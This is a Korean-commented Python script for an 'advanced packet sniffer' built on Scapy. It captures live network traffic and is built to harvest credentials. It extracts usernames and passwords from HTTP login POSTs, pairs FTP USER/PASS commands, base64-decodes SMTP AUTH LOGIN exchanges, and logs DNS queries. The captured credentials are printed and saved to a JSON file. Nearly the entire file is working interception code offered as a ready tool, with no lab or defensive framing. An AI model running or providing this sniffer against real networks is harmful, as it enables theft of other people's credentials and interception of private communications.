#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
고급 패킷 스니퍼
이 스크립트는 Scapy를 사용하여 네트워크 패킷을 캡처하고 분석합니다.
HTTP, DNS, FTP 등 다양한 프로토콜의 패킷을 분석하고 민감한 정보를 추출합니다.
"""

import argparse
import time
import os
from datetime import datetime
from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
import re
import json
import signal
import sys

# 전역 변수
captured_packets = []
credentials = []
http_sessions = {}
dns_queries = {}
start_time = None
output_file = None

# ANSI 색상 코드
COLORS = {
    'HEADER': '\033[95m',
    'BLUE': '\033[94m',
    'GREEN': '\033[92m',
    'WARNING': '\033[93m',
    'RED': '\033[91m',
    'ENDC': '\033[0m',
    'BOLD': '\033[1m',
    'UNDERLINE': '\033[4m'
}

def print_colored(text, color):
    """색상이 지정된 텍스트 출력"""
    if os.name == 'nt':  # Windows에서는 ANSI 색상이 기본적으로 지원되지 않음
        print(text)
    else:
        print(f"{COLORS[color]}{text}{COLORS['ENDC']}")

def signal_handler(sig, frame):
    """Ctrl+C 시그널 처리"""
    print_colored("\n\n[*] 스니핑 중단. 결과 저장 중...", 'WARNING')
    save_results()
    print_colored(f"[+] 결과가 {output_file}에 저장되었습니다.", 'GREEN')
    sys.exit(0)

def process_tcp_packet(packet):
    """TCP 패킷 처리"""
    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        
        # 기본 TCP 연결 정보 기록
        connection_info = f"TCP {ip_src}:{sport} -> {ip_dst}:{dport}"
        
        # HTTP 트래픽 분석 (포트 80, 8080, 8000)
        if dport in [80, 8080, 8000] or sport in [80, 8080, 8000]:
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode('utf-8', 'ignore')
                    
                    # HTTP 요청 분석
                    if "GET " in payload or "POST " in payload:
                        session_key = f"{ip_src}:{sport}-{ip_dst}:{dport}"
                        
                        # HTTP 메서드 추출
                        method_match = re.search(r'(GET|POST|PUT|DELETE) (.*?) HTTP', payload)
                        if method_match:
                            method = method_match.group(1)
                            path = method_match.group(2)
                            
                            # 호스트 추출
                            host_match = re.search(r'Host: (.*?)\r\n', payload)
                            host = host_match.group(1) if host_match else "Unknown"
                            
                            # 세션 정보 저장
                            http_sessions[session_key] = {
                                'method': method,
                                'host': host,
                                'path': path,
                                'request': payload[:500] + "..." if len(payload) > 500 else payload,
                                'response': None,
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            
                            print_colored(f"[HTTP] {method} {host}{path}", 'BLUE')
                            
                            # 인증 정보 추출 (POST 요청에서)
                            if method == "POST" and ("login" in path.lower() or "auth" in path.lower()):
                                # 폼 데이터 추출 시도
                                if "\r\n\r\n" in payload:
                                    body = payload.split("\r\n\r\n", 1)[1]
                                    
                                    # 사용자 이름/이메일 추출
                                    user_match = re.search(r'(username|email|user|id)=([^&]+)', body, re.IGNORECASE)
                                    user = user_match.group(2) if user_match else "Unknown"
                                    
                                    # 비밀번호 추출
                                    pass_match = re.search(r'(password|pass|pwd)=([^&]+)', body, re.IGNORECASE)
                                    password = pass_match.group(2) if pass_match else "Unknown"
                                    
                                    if user != "Unknown" or password != "Unknown":
                                        cred_info = {
                                            'type': 'HTTP POST',
                                            'host': host,
                                            'path': path,
                                            'username': user,
                                            'password': password,
                                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                        }
                                        credentials.append(cred_info)
                                        print_colored(f"[!] 인증 정보 발견: {host} - {user}:{password}", 'RED')
                    
                    # HTTP 응답 분석
                    elif "HTTP/" in payload and ("200 OK" in payload or "302 Found" in payload):
                        session_key = f"{ip_dst}:{dport}-{ip_src}:{sport}"
                        
                        if session_key in http_sessions:
                            http_sessions[session_key]['response'] = payload[:500] + "..." if len(payload) > 500 else payload
                            print_colored(f"[HTTP] 응답: {ip_src} -> {ip_dst} ({http_sessions[session_key]['method']} {http_sessions[session_key]['host']}{http_sessions[session_key]['path']})", 'GREEN')
                
                except Exception as e:
                    pass  # 디코딩 오류 무시
        
        # FTP 트래픽 분석 (포트 21)
        elif dport == 21 or sport == 21:
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode('utf-8', 'ignore')
                    
                    # FTP 사용자 이름
                    user_match = re.match(r'^USER (.*?)\r\n', payload)
                    if user_match:
                        print_colored(f"[FTP] 사용자 이름: {user_match.group(1)}", 'BLUE')
                        
                    # FTP 비밀번호
                    pass_match = re.match(r'^PASS (.*?)\r\n', payload)
                    if pass_match:
                        print_colored(f"[FTP] 비밀번호: {pass_match.group(1)}", 'RED')
                        
                        # 이전 USER 명령어 찾기
                        for i in range(len(captured_packets) - 1, -1, -1):
                            prev_packet = captured_packets[i]
                            if prev_packet.haslayer(Raw) and prev_packet.haslayer(IP) and prev_packet.haslayer(TCP):
                                if prev_packet[IP].src == ip_src and prev_packet[TCP].dport == 21:
                                    try:
                                        prev_payload = prev_packet[Raw].load.decode('utf-8', 'ignore')
                                        prev_user_match = re.match(r'^USER (.*?)\r\n', prev_payload)
                                        if prev_user_match:
                                            username = prev_user_match.group(1)
                                            password = pass_match.group(1)
                                            
                                            cred_info = {
                                                'type': 'FTP',
                                                'host': ip_dst,
                                                'username': username,
                                                'password': password,
                                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                            }
                                            credentials.append(cred_info)
                                            print_colored(f"[!] FTP 인증 정보 발견: {ip_dst} - {username}:{password}", 'RED')
                                            break
                                    except:
                                        pass
                except:
                    pass
        
        # SMTP 트래픽 분석 (포트 25, 587)
        elif dport in [25, 587] or sport in [25, 587]:
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode('utf-8', 'ignore')
                    
                    # SMTP 인증
                    if "AUTH LOGIN" in payload:
                        print_colored(f"[SMTP] 인증 시도 감지: {ip_src} -> {ip_dst}", 'BLUE')
                    
                    # Base64로 인코딩된 사용자 이름/비밀번호 (일반적인 SMTP 인증 방식)
                    if len(payload.strip()) % 4 == 0:
                        try:
                            decoded = base64.b64decode(payload.strip()).decode('utf-8')
                            if '@' in decoded:  # 이메일 주소 형태인 경우
                                print_colored(f"[SMTP] 가능한 사용자 이름: {decoded}", 'RED')
                            elif len(decoded) >= 4:  # 비밀번호일 가능성이 있는 경우
                                print_colored(f"[SMTP] 가능한 비밀번호: {decoded}", 'RED')
                        except:
                            pass
                except:
                    pass
        
        return connection_info
    return None

def process_udp_packet(packet):
    """UDP 패킷 처리"""
    if packet.haslayer(IP) and packet.haslayer(UDP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        sport = packet[UDP].sport
        dport = packet[UDP].dport
        
        connection_info = f"UDP {ip_src}:{sport} -> {ip_dst}:{dport}"
        
        # DNS 트래픽 분석 (포트 53)
        if dport == 53 or sport == 53:
            if packet.haslayer(DNS):
                if packet.haslayer(DNSQR):  # DNS 쿼리
                    qname = packet[DNSQR].qname.decode('utf-8')
                    qtype = packet[DNSQR].qtype
                    
                    # DNS 쿼리 유형 변환
                    qtype_name = "A"  # 기본값
                    if qtype == 1:
                        qtype_name = "A"
                    elif qtype == 28:
                        qtype_name = "AAAA"
                    elif qtype == 5:
                        qtype_name = "CNAME"
                    elif qtype == 15:
                        qtype_name = "MX"
                    elif qtype == 16:
                        qtype_name = "TXT"
                    
                    print_colored(f"[DNS] 쿼리: {qname} ({qtype_name})", 'BLUE')
                    
                    # DNS 쿼리 저장
                    if qname not in dns_queries:
                        dns_queries[qname] = {
                            'query_count': 0,
                            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'clients': set(),
                            'types': set()
                        }
                    
                    dns_queries[qname]['query_count'] += 1
                    dns_queries[qname]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    dns_queries[qname]['clients'].add(ip_src)
                    dns_queries[qname]['types'].add(qtype_name)
                
                if packet.haslayer(DNSRR):  # DNS 응답
                    an = packet[DNS].an
                    if an is not None:
                        for i in range(packet[DNS].ancount):
                            if isinstance(an[i], DNSRR):
                                rname = an[i].rrname.decode('utf-8')
                                rdata = an[i].rdata
                                if isinstance(rdata, bytes):
                                    rdata = rdata.decode('utf-8', 'ignore')
                                print_colored(f"[DNS] 응답: {rname} -> {rdata}", 'GREEN')
        
        return connection_info
    return None

def packet_callback(packet):
    """모든 패킷 처리"""
    # 패킷 저장 (최대 1000개)
    if len(captured_packets) >= 1000:
        captured_packets.pop(0)  # 가장 오래된 패킷 제거
    captured_packets.append(packet)
    
    # 패킷 타입에 따라 처리
    if packet.haslayer(TCP):
        return process_tcp_packet(packet)
    elif packet.haslayer(UDP):
        return process_udp_packet(packet)
    elif packet.haslayer(ICMP):
        if packet.haslayer(IP):
            return f"ICMP {packet[IP].src} -> {packet[IP].dst} (Type: {packet[ICMP].type})"
    
    return None

def save_results():
    """결과를 JSON 파일로 저장"""
    global output_file
    
    # DNS 쿼리 정보 정리 (set을 list로 변환)
    dns_queries_json = {}
    for domain, info in dns_queries.items():
        dns_queries_json[domain] = {
            'query_count': info['query_count'],
            'first_seen': info['first_seen'],
            'last_seen': info['last_seen'],
            'clients': list(info['clients']),
            'types': list(info['types'])
        }
    
    # HTTP 세션 정보 정리
    http_sessions_json = {}
    for session_key, info in http_sessions.items():
        http_sessions_json[session_key] = info
    
    # 결과 데이터 구성
    results = {
        'start_time': start_time,
        'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'credentials': credentials,
        'http_sessions': http_sessions_json,
        'dns_queries': dns_queries_json
    }
    
    # 결과 저장
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=4, ensure_ascii=False)

def main():
    global start_time, output_file
    
    # 명령행 인자 파싱
    parser = argparse.ArgumentParser(description='고급 패킷 스니퍼')
    parser.add_argument('-i', '--interface', default='eth0', help='캡처할 네트워크 인터페이스')
    parser.add_argument('-c', '--count', type=int, default=0, help='캡처할 패킷 수 (0은 무제한)')
    parser.add_argument('-f', '--filter', default='', help='BPF 필터 (예: "port 80" 또는 "host 192.168.1.1")')
    parser.add_argument('-o', '--output', default='sniffing_results.json', help='결과를 저장할 JSON 파일')
    args = parser.parse_args()
    
    output_file = args.output
    start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Ctrl+C 시그널 핸들러 등록
    signal.signal(signal.SIGINT, signal_handler)
    
    # 시작 메시지
    print_colored("=" * 60, 'HEADER')
    print_colored(" 고급 패킷 스니퍼 시작", 'HEADER')
    print_colored("=" * 60, 'HEADER')
    print_colored(f"[*] 인터페이스: {args.interface}", 'BLUE')
    print_colored(f"[*] 필터: {args.filter if args.filter else '없음'}", 'BLUE')
    print_colored(f"[*] 패킷 수: {'무제한' if args.count == 0 else args.count}", 'BLUE')
    print_colored(f"[*] 시작 시간: {start_time}", 'BLUE')
    print_colored(f"[*] 결과 파일: {output_file}", 'BLUE')
    print_colored("=" * 60, 'HEADER')
    print_colored("[*] 패킷 캡처 중... (Ctrl+C로 중단)", 'WARNING')
    print_colored("=" * 60, 'HEADER')
    
    # 패킷 스니핑 시작
    try:
        sniff(
            iface=args.interface,
            prn=packet_callback,
            filter=args.filter,
            store=0,
            count=args.count if args.count > 0 else None
        )
    except Exception as e:
        print_colored(f"[!] 오류 발생: {e}", 'RED')
    
    # 결과 저장
    save_results()
    print_colored(f"[+] 결과가 {output_file}에 저장되었습니다.", 'GREEN')

if __name__ == "__main__":
    main()
